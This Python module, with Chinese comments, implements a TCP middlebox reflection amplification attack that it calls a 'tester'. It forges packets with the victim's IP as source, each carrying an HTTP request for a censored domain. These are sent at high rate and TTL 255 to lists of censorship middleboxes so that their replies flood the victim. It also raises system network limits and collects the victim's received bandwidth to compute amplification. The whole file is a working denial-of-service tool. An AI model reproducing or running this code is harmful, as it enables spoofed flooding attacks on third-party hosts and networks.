"""
TCP 中间盒攻击测试器

核心原理：向审查中间盒发送伪造源IP（受害者IP）的特殊TCP包
（PSH/PSH_ACK/SYN/SYN_PSH_ACK/SYN_PSH），触发中间盒向受害者回包，实现反射攻击。

与测量模式的区别：测量时源IP为本机IP（用于观察回包计算放大倍数），
攻击时源IP伪造为待攻击目标IP（使中间盒回包打向受害者）。
"""
import os
import time
import socket
import struct
import threading
import random
import logging
import traceback
from threading import Lock
from typing import List, Dict, Optional, Callable, Any
from pathlib import Path

from scapy.all import IP, TCP, Raw, send

logger = logging.getLogger(__name__)

# TCP 发包方式映射 (与 magnification_test_1.py 的 METHOD_MAP 一致)
PKT_METHOD_MAP = {
    "SYN_PSH_ACK": 1,
    "SYN_PSH": 2,
    "PSH": 3,
    "PSH_ACK": 4,
    "SYN": 5,
}

VALID_PKT_METHODS = {"PSH", "PSH_ACK", "SYN", "SYN_PSH_ACK", "SYN_PSH"}

# 默认敏感 Payload（HTTP GET 请求）
DEFAULT_PAYLOAD = (
    "GET / HTTP/1.1\r\n"
    "Host: www.youporn.com\r\n"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    "Connection: close\r\n\r\n"
)


class TcpTester:
    """TCP中间盒攻击测试器"""

    def __init__(self):
        self.is_running = False
        self.stats_callback = None
        self.threads = []
        self.stats_lock = Lock()

        # 测试统计信息
        self.test_stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'current_pps': 0,
            'current_mbps': 0,
            'victim_mbps': 0.0,
            'max_amplification_factor': 0.0,
            'progress_percent': 0,
        }

        # TCP 服务器配置（中间盒 IP 列表）
        self.servers_dir = Path('attack_resources/tcp/resources/ip_lists')
        self.tcp_servers = []

        # 远程监控信息
        self.remote_recv_mbps = 0.0
        self.remote_last_update = 0
        self.max_amplification_factor = 0.0

        # 时间记录
        self.start_time = 0
        self.end_time = 0

        # TCP 攻击特有配置
        self.tcp_pkt_methods = ["PSH", "PSH_ACK"]  # 默认发包方式
        self.sensitive_payload = DEFAULT_PAYLOAD
        self.ttl = 255  # 论文推荐TTL=255利用路由环路放大
        self.seq = 1000  # 固定序列号

        # IP 来源追踪（日志输出用）
        self._last_source_description: str = ""

    def run_test(
        self,
        target_ip: str,
        target_port: int = 80,
        duration_minutes: int = 5,
        threads: int = 8,
        spoof_source_ip: Optional[str] = None,
        spoof_source_port: int = 0,
        data_size_kb: int = 300,
        target_pps: int = 5000,
        stats_callback: Optional[Callable[[Dict], None]] = None,
        tcp_pkt_methods: Optional[List[str]] = None,
        ttl: int = 255,
        source_files: Optional[List[str]] = None,
    ) -> None:
        """运行 TCP 中间盒攻击测试"""
        # 设置 TTL（论文推荐 255，利用路由环路放大）
        if isinstance(ttl, int) and 1 <= ttl <= 255:
            self.ttl = ttl

        # 设置伪造源IP/端口
        if not spoof_source_ip:
            spoof_source_ip = target_ip
        if spoof_source_port == 0:
            spoof_source_port = target_port

        # 设置发包方式
        if tcp_pkt_methods:
            methods = [m for m in tcp_pkt_methods if m in VALID_PKT_METHODS]
            if methods:
                self.tcp_pkt_methods = methods

        logger.info(f"开始TCP中间盒攻击测试")
        logger.info(f"受害者: {target_ip}:{target_port}")
        logger.info(f"伪造源: {spoof_source_ip}:{spoof_source_port}")
        logger.info(f"发包方式: {self.tcp_pkt_methods}")

        self.is_running = True
        self.stats_callback = stats_callback
        self.start_time = time.time()
        self.end_time = self.start_time + (duration_minutes * 60)

        # 重置统计
        with self.stats_lock:
            for key in self.test_stats:
                if isinstance(self.test_stats[key], (int, float)):
                    self.test_stats[key] = 0
            self.test_stats['victim_mbps'] = 0.0
            self.test_stats['max_amplification_factor'] = 0.0

        try:
            # 加载 TCP 中间盒 IP 列表（支持按 source_files 限定来源，默认优先优质池）
            servers = self._load_servers(source_files=source_files)
            if not servers:
                logger.error("没有可用的TCP中间盒IP")
                if self.stats_callback:
                    self.stats_callback({'error_message': '没有可用的TCP中间盒IP，请先运行TCP扫描获取IP列表或在资源管理中选择源文件'})
                return

            logger.info(f"加载了 {len(servers)} 个TCP中间盒IP（来源: {self._last_source_description or '优质池/全部'}）")

            # 优化系统设置
            self._optimize_system()

            # 清理之前的线程
            self.threads = []

            # 启动反馈监听线程
            feedback_thread = threading.Thread(target=self._feedback_listener)
            feedback_thread.daemon = True
            feedback_thread.start()

            # 启动统计更新线程
            stats_thread = threading.Thread(target=self._stats_updater, args=(self.end_time,))
            stats_thread.daemon = True
            stats_thread.start()
            self.threads.append(stats_thread)

            # 计算每个线程的目标 PPS
            target_pps_per_thread = max(1, target_pps // threads)

            # 启动发送线程
            for i in range(threads):
                t = threading.Thread(
                    target=self._send_worker,
                    args=(
                        i,
                        servers,
                        spoof_source_ip,
                        spoof_source_port,
                        self.end_time,
                        target_pps_per_thread,
                    ),
                )
                t.daemon = True
                t.start()
                self.threads.append(t)

            logger.info(f"启动 {threads} 个发送线程，目标PPS: {target_pps}")

            # 等待测试结束
            while self.is_running and time.time() < self.end_time:
                time.sleep(1)

            # 等待所有线程结束
            for t in self.threads:
                if t.is_alive():
                    t.join(timeout=2)

            logger.info("TCP中间盒攻击测试完成")

            # 发送最终统计
            if self.stats_callback:
                final_stats = self.test_stats.copy()
                final_stats.update({
                    'victim_mbps': self.remote_recv_mbps,
                    'max_amplification_factor': self.max_amplification_factor,
                    'progress_percent': 100,
                })
                self.stats_callback(final_stats)

        except Exception as e:
            logger.error(f"TCP攻击测试执行错误: {str(e)}\n{traceback.format_exc()}")
            if self.stats_callback:
                self.stats_callback({'error_message': str(e)})
        finally:
            self.is_running = False

    def stop_test(self) -> None:
        """停止测试"""
        self.is_running = False
        logger.info("正在停止TCP中间盒攻击测试...")

    def cleanup(self) -> None:
        """清理资源"""
        self.is_running = False
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        logger.info("TCP攻击测试资源清理完成")

    def get_stats(self) -> Dict[str, Any]:
        """获取当前统计信息"""
        with self.stats_lock:
            stats_copy = self.test_stats.copy()
            stats_copy.update({
                'remote_recv_mbps': self.remote_recv_mbps,
                'remote_last_update': self.remote_last_update,
                'max_amplification_factor': self.max_amplification_factor,
                'is_data_fresh': (time.time() - self.remote_last_update) < 3.0,
            })
            return stats_copy

    # ---- 内部方法 ----

    def _load_servers(self, source_files: Optional[List[str]] = None) -> List[str]:
        """从 ip_lists/ 目录加载 TCP 中间盒 IP，支持来源限定。

        策略：
        1) 若 source_files 非空，只从指定文件加载（允许前端或上游限定为优质池/具体文件/全部）。
        2) 若未指定来源，则先尝试优质池文件（qualified_pool.txt / qualified_pool 目录）；
           优质池为空或不存在时再回退到目录内全部 .txt，避免混入未验证的原始国家列表。
        """
        from pathlib import Path

        servers: List[str] = []
        loaded_paths: List[str] = []

        if not self.servers_dir.exists():
            logger.warning(f"TCP中间盒IP目录为空或无有效IP: {self.servers_dir}")
            self._last_source_description = "目录不存在"
            return servers

        qualified_names = {"qualified_pool.txt"}

        def _read_servers_from_file(file_path: Path) -> List[str]:
            result: List[str] = []
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            result.append(line)
            except Exception as e:
                logger.warning(f"加载IP文件 {file_path} 失败: {e}")
            return result

        # 情况 1：调用方明确指定了源文件（可能是优质池、具体文件、或"全部"对应的多文件列表）
        if source_files:
            for src in source_files:
                if not src:
                    continue
                candidate = Path(src)
                # 支持传绝对路径
                if not candidate.is_absolute():
                    # 相对路径先按 servers_dir 解析，失败再按项目根尝试
                    candidate = self.servers_dir / candidate
                if candidate.exists() and candidate.is_file():
                    loaded_paths.append(str(candidate))
                    servers.extend(_read_servers_from_file(candidate))
                else:
                    # 也允许传文件名（不带路径），从 servers_dir 中匹配
                    named = self.servers_dir / str(Path(src).name)
                    if named.exists() and named.is_file():
                        loaded_paths.append(str(named))
                        servers.extend(_read_servers_from_file(named))
            self._last_source_description = f"指定来源({len(loaded_paths)}个文件)" if loaded_paths else "指定来源未找到匹配文件"

        # 情况 2：未指定来源，默认优先优质池 → 回退全部
        else:
            # 优先尝试优质池：servers_dir 下的 qualified_pool.txt
            qualified_candidates = [
                self.servers_dir / "qualified_pool.txt",
            ]
            # 也接受 qualified_pool 目录（虽然历史上与 resources/ip_lists 是两个位置，但保持兼容尝试）
            alt_qualified_dir = self.servers_dir.parent.parent / "qualified_pool"
            if alt_qualified_dir.exists():
                qualified_candidates.append(alt_qualified_dir / "qualified_pool.txt")

            found_qualified = False
            for qp in qualified_candidates:
                if qp.exists() and qp.is_file():
                    loaded_paths.append(str(qp))
                    servers.extend(_read_servers_from_file(qp))
                    found_qualified = True
                    break

            if found_qualified and servers:
                self._last_source_description = "优质池(qualified_pool.txt)"
            else:
                # 优质池为空或不存在：回退加载全部 .txt（含原始国家列表）
                all_txt_files = sorted(self.servers_dir.glob("*.txt"))
                for txt_file in all_txt_files:
                    try:
                        loaded_paths.append(str(txt_file))
                        servers.extend(_read_servers_from_file(txt_file))
                    except Exception as e:
                        logger.warning(f"加载IP文件 {txt_file} 失败: {e}")
                if found_qualified and not servers:
                    self._last_source_description = "优质池为空，已回退加载全部.txt"
                else:
                    self._last_source_description = "全部 .txt 文件"

        if not servers:
            logger.warning(f"TCP中间盒IP目录为空或无有效IP: {self.servers_dir}")

        # 去重并随机打乱
        servers = list(set(servers))
        random.shuffle(servers)
        return servers

    def _build_attack_packets(
        self,
        ip: str,
        spoof_ip: str,
        spoof_port: int,
        method: str,
        ttl: int,
    ) -> List:
        """
        为指定方法构造攻击数据包。

        关键改动（相比测量模式的 build_packets）：
        - IP 层添加 src=spoof_ip（受害者IP，伪造源）
        - TCP 层 sport=spoof_port（受害者端口，伪造源端口）
        """
        packets = []
        method_num = PKT_METHOD_MAP.get(method)

        if method_num == 1:  # SYN_PSH_ACK
            syn_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="S", seq=self.seq
            )
            psh_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="PA", seq=self.seq + 1, ack=1
            ) / Raw(load=self.sensitive_payload)
            packets = [syn_pkt, psh_pkt]

        elif method_num == 2:  # SYN_PSH
            syn_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="S", seq=self.seq
            )
            psh_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="P", seq=self.seq + 1
            ) / Raw(load=self.sensitive_payload)
            packets = [syn_pkt, psh_pkt]

        elif method_num == 3:  # PSH
            psh_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="P", seq=self.seq
            ) / Raw(load=self.sensitive_payload)
            packets = [psh_pkt]

        elif method_num == 4:  # PSH_ACK
            psh_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="PA", seq=self.seq, ack=1
            ) / Raw(load=self.sensitive_payload)
            packets = [psh_pkt]

        elif method_num == 5:  # SYN with GET (论文方法5)
            syn_pkt = IP(src=spoof_ip, dst=ip, ttl=ttl) / TCP(
                dport=80, sport=spoof_port, flags="S", seq=self.seq
            ) / Raw(load=self.sensitive_payload)
            packets = [syn_pkt]

        return packets

    def _optimize_system(self):
        """优化系统设置"""
        try:
            if os.name == 'posix':
                os.system('ulimit -n 65536 2>/dev/null')
                os.system('sysctl -w net.core.rmem_max=67108864 2>/dev/null')
                os.system('sysctl -w net.core.wmem_max=67108864 2>/dev/null')
                os.system('sysctl -w net.core.netdev_max_backlog=200000 2>/dev/null')
            logger.info("系统优化已应用")
        except Exception:
            logger.warning("系统优化失败")

    def _send_worker(
        self,
        worker_id: int,
        servers: List[str],
        spoof_ip: str,
        spoof_port: int,
        end_time: float,
        target_pps_per_thread: int,
    ):
        """发送工作线程"""
        logger.debug(f"TCP发送线程 {worker_id} 启动 | 方法: {self.tcp_pkt_methods}")

        if not servers:
            logger.error(f"线程 {worker_id}: 没有可用的TCP中间盒IP")
            return

        packet_count = 0
        server_index = 0
        batch_size = max(1, min(10, target_pps_per_thread // 10))

        try:
            while self.is_running and time.time() < end_time:
                batch_packets = 0
                batch_bytes = 0
                batch_start = time.time()

                for _ in range(batch_size):
                    if not self.is_running or time.time() >= end_time:
                        break

                    # 轮询选择目标 IP
                    dst_ip = servers[server_index % len(servers)]
                    server_index += 1

                    # 随机选择一个发包方式
                    method = random.choice(self.tcp_pkt_methods)

                    try:
                        packets = self._build_attack_packets(
                            ip=dst_ip,
                            spoof_ip=spoof_ip,
                            spoof_port=spoof_port,
                            method=method,
                            ttl=self.ttl,
                        )
                        for pkt in packets:
                            send(pkt, verbose=0)
                            batch_packets += 1
                            batch_bytes += len(bytes(pkt))
                    except Exception:
                        pass  # 单个包发送失败不影响整体

                # 更新统计
                with self.stats_lock:
                    self.test_stats['packets_sent'] += batch_packets
                    self.test_stats['bytes_sent'] += batch_bytes
                packet_count += batch_packets

                # 速率控制
                batch_time = time.time() - batch_start
                expected_batch_time = (
                    batch_size / target_pps_per_thread
                    if target_pps_per_thread > 0
                    else 0.1
                )
                if batch_time < expected_batch_time:
                    time.sleep(expected_batch_time - batch_time)

        except Exception as e:
            logger.error(f"TCP发送线程 {worker_id} 错误: {str(e)}\n{traceback.format_exc()}")

        logger.debug(f"TCP发送线程 {worker_id} 结束，发送了 {packet_count} 个包")

    def _feedback_listener(self):
        """反馈监听线程 - 接收受害机UDP 9999端口带宽汇报"""
        listen_port = 9999
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', listen_port))
            sock.settimeout(2.0)
            logger.info(f"TCP反馈监听线程启动，端口 {listen_port}")
        except Exception as e:
            logger.error(f"无法启动TCP反馈监听线程: {str(e)}")
            return

        while self.is_running:
            try:
                data, _ = sock.recvfrom(1024)
                try:
                    val = float(data.decode().strip())
                    with self.stats_lock:
                        self.remote_recv_mbps = val
                        self.remote_last_update = time.time()
                        self.test_stats['victim_mbps'] = val
                except ValueError:
                    pass
            except socket.timeout:
                pass
            except Exception:
                pass

        sock.close()
        logger.debug("TCP反馈监听线程结束")

    def _stats_updater(self, end_time: float):
        """统计更新线程"""
        logger.debug("TCP统计更新线程启动")

        last_packets_sent = 0
        last_bytes_sent = 0
        last_update_time = time.time()

        while self.is_running and time.time() < end_time:
            try:
                time.sleep(2)
                current_time = time.time()
                time_diff = current_time - last_update_time

                if time_diff > 0:
                    with self.stats_lock:
                        current_packets_sent = self.test_stats['packets_sent']
                        current_bytes_sent = self.test_stats['bytes_sent']

                        # PPS
                        packets_diff = current_packets_sent - last_packets_sent
                        pps = packets_diff / time_diff

                        # Mbps
                        bytes_diff = current_bytes_sent - last_bytes_sent
                        mbps = (bytes_diff * 8) / (time_diff * 1_000_000)

                        self.test_stats['current_pps'] = pps
                        self.test_stats['current_mbps'] = mbps

                        victim_mbps = self.remote_recv_mbps
                        last_update = self.remote_last_update
                        is_data_fresh = (current_time - last_update) < 3.0

                        # 计算实际放大倍数
                        if mbps > 0.1 and is_data_fresh:
                            real_af = victim_mbps / mbps if mbps > 0 else 0
                            if real_af > self.max_amplification_factor:
                                self.max_amplification_factor = real_af
                                self.test_stats['max_amplification_factor'] = real_af

                        # 进度
                        elapsed = current_time - self.start_time
                        total = end_time - self.start_time
                        progress = min(100, (elapsed / total * 100)) if total > 0 else 0
                        self.test_stats['progress_percent'] = progress

                        if self.stats_callback:
                            stats_copy = self.test_stats.copy()
                            stats_copy.update({
                                'victim_mbps': victim_mbps,
                                'is_data_fresh': is_data_fresh,
                                'max_amplification_factor': self.max_amplification_factor,
                                'progress_percent': progress,
                            })
                            self.stats_callback(stats_copy)

                        last_packets_sent = current_packets_sent
                        last_bytes_sent = current_bytes_sent
                        last_update_time = current_time

            except Exception as e:
                logger.error(f"TCP统计更新错误: {str(e)}")

        logger.debug("TCP统计更新线程结束")
